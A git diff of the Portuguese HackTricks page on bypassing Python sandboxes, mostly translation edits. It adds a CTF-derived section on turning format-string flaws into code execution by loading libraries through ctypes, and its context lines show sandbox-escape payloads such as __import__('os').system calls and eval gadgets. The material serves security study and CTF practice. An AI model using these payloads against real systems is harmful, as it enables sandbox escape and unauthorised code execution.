@@ -1,8 +1,8 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -58,7 +58,7 @@ Lembre-se de que as funções _**open**_ e _**read**_ podem ser úteis para **le
 A função **input()** do Python2 permite executar código python antes que o programa falhe.
 {% endhint %}
 
-O Python tenta **carregar bibliotecas do diretório atual primeiro** (o comando a seguir imprimirá de onde o python está carregando módulos): `python3 -c 'import sys; print(sys.path)'`
+O Python tenta **carregar bibliotecas do diretório atual primeiro** (o comando a seguir imprimirá de onde o python está carregando os módulos): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
@@ -103,7 +103,7 @@ Este pacote é chamado `Reverse`. No entanto, ele foi especialmente elaborado pa
 ## Avaliando código python
 
 {% hint style="warning" %}
-Note que exec permite strings multilinha e ";", mas eval não permite (ver operador morsa)
+Note que exec permite strings multilinha e ";", mas eval não permite (ver operador walrus)
 {% endhint %}
 
 Se certos caracteres forem proibidos, você pode usar a **representação hex/octal/B64** para **burlar** a restrição:
@@ -152,7 +152,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassando proteções através de codificações (UTF-7)
 
-Em [**este relatório**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), o UFT-7 é usado para carregar e executar código python arbitrário dentro de uma aparente sandbox:
+Em [**este artigo**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), o UFT-7 é usado para carregar e executar código python arbitrário dentro de uma aparente sandbox:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -330,9 +330,9 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### Sem Builtins
 
 Quando você não tem `__builtins__`, você não poderá importar nada nem mesmo ler ou escrever arquivos, pois **todas as funções globais** (como `open`, `import`, `print`...) **não estão carregadas**.\
-No entanto, **por padrão, o python importa muitos módulos na memória**. Esses módulos podem parecer benignos, mas alguns deles **também estão importando funcionalidades perigosas** dentro deles que podem ser acessadas para obter até mesmo **execução de código arbitrário**.
+No entanto, **por padrão, o python importa muitos módulos na memória**. Esses módulos podem parecer benignos, mas alguns deles **também estão importando** funcionalidades **perigosas** dentro deles que podem ser acessadas para obter até mesmo **execução de código arbitrário**.
 
-Nos exemplos a seguir, você pode observar como **abusar** de alguns desses módulos "**benignos**" carregados para **acessar** **funcionalidades** **perigosas** dentro deles.
+Nos exemplos a seguir, você pode observar como **abusar** de alguns desses módulos "**benignos**" carregados para **acessar** funcionalidades **perigosas** dentro deles.
 
 **Python2**
 ```python
@@ -553,7 +553,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Pesquisa Recursiva de Builtins, Globals...
 
 {% hint style="warning" %}
-Isso é simplesmente **incrível**. Se você está **procurando um objeto como globals, builtins, open ou qualquer coisa** basta usar este script para **encontrar recursivamente lugares onde você pode encontrar esse objeto.**
+Isso é simplesmente **incrível**. Se você está **procurando por um objeto como globals, builtins, open ou qualquer outra coisa**, basta usar este script para **encontrar recursivamente lugares onde você pode encontrar esse objeto.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -679,11 +679,6 @@ Você pode verificar a saída deste script nesta página:
 ## Python Format String
 
 Se você **enviar** uma **string** para o python que vai ser **formatada**, você pode usar `{}` para acessar **informações internas do python.** Você pode usar os exemplos anteriores para acessar globals ou builtins, por exemplo.
-
-{% hint style="info" %}
-No entanto, há uma **limitação**, você só pode usar os símbolos `.[]`, então você **não poderá executar código arbitrário**, apenas ler informações.\
-_**Se você souber como executar código através dessa vulnerabilidade, por favor, entre em contato comigo.**_
-{% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -723,10 +718,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Mais exemplos** sobre **exemplos** de **string** **format** podem ser encontrados em [**https://pyformat.info/**](https://pyformat.info)
+**Mais exemplos** sobre **exemplos** de **string** de **formato** podem ser encontrados em [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Verifique também a seguinte página para gadgets que irão r**ealizar a leitura de informações sensíveis de objetos internos do Python**:
+Verifique também a seguinte página para gadgets que irão r**evelar informações sensíveis de objetos internos do Python**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -743,11 +738,55 @@ Verifique também a seguinte página para gadgets que irão r**ealizar a leitura
 
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+
+# Example from https://corgi.rip/posts/buckeye-writeups/
+secret_variable = "clueless"
+x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
+str(x) # Out: clueless
 ```
+### De formato a RCE carregando bibliotecas
+
+De acordo com o [**desafio TypeMonkey deste relatório**](https://corgi.rip/posts/buckeye-writeups/), é possível carregar bibliotecas arbitrárias do disco abusando da vulnerabilidade de string de formato em python.
+
+Como lembrete, toda vez que uma ação é realizada em python, alguma função é executada. Por exemplo, `2*3` executará **`(2).mul(3)`** ou **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
+
+Você pode encontrar mais como isso na seção [**Execução de Python sem chamadas**](./#python-execution-without-calls).
+
+Uma vulnerabilidade de string de formato em python não permite executar funções (não permite o uso de parênteses), então não é possível obter RCE como `'{0.system("/bin/sh")}'.format(os)`.\
+No entanto, é possível usar `[]`. Portanto, se uma biblioteca python comum tiver um método **`__getitem__`** ou **`__getattr__`** que execute código arbitrário, é possível abusar deles para obter RCE.
+
+Procurando por um gadget assim em python, o relatório propõe esta [**consulta de busca no Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Onde ele encontrou este [aqui](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+```python
+class LibraryLoader(object):
+def __init__(self, dlltype):
+self._dlltype = dlltype
+
+def __getattr__(self, name):
+if name[0] == '_':
+raise AttributeError(name)
+try:
+dll = self._dlltype(name)
+except OSError:
+raise AttributeError(name)
+setattr(self, name, dll)
+return dll
+
+def __getitem__(self, name):
+return getattr(self, name)
+
+cdll = LibraryLoader(CDLL)
+pydll = LibraryLoader(PyDLL)
+```
+Este gadget permite **carregar uma biblioteca do disco**. Portanto, é necessário de alguma forma **escrever ou fazer upload da biblioteca para carregar** corretamente compilada no servidor atacado.
+```python
+'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
+```
+A challenge na verdade explora outra vulnerabilidade no servidor que permite criar arquivos arbitrários no disco dos servidores.
+
 ## Dissecando Objetos Python
 
 {% hint style="info" %}
-Se você quer **aprender** sobre **bytecode python** em profundidade, leia este **incrível** post sobre o tema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Se você quiser **aprender** sobre **bytecode python** em profundidade, leia este **incrível** post sobre o tópico: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
 Em alguns CTFs, você pode receber o nome de uma **função personalizada onde a flag** reside e você precisa ver os **internos** da **função** para extraí-la.
@@ -933,7 +972,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-Dependendo da versão do python, os **parâmetros** de `code_type` podem ter uma **ordem diferente**. A melhor maneira de saber a ordem dos parâmetros na versão do python que você está executando é rodar:
+Dependendo da versão do python, os **parâmetros** de `code_type` podem ter uma **ordem diferente**. A melhor maneira de saber a ordem dos parâmetros na versão do python que você está executando é executar:
 ```
 import types
 types.CodeType.__doc__
@@ -988,7 +1027,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Se você não consegue acessar `eval` ou `exec`, você pode criar uma **função adequada**, mas chamá-la diretamente geralmente falhará com: _construtor não acessível em modo restrito_. Portanto, você precisa de uma **função que não esteja no ambiente restrito para chamar essa função.**
+Se você não pode acessar `eval` ou `exec`, você poderia criar uma **função adequada**, mas chamá-la diretamente geralmente falhará com: _construtor não acessível em modo restrito_. Portanto, você precisa de uma **função que não esteja no ambiente restrito para chamar essa função.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1031,14 +1070,13 @@ será contornado
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
 {% hint style="success" %}
-Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Suporte ao HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
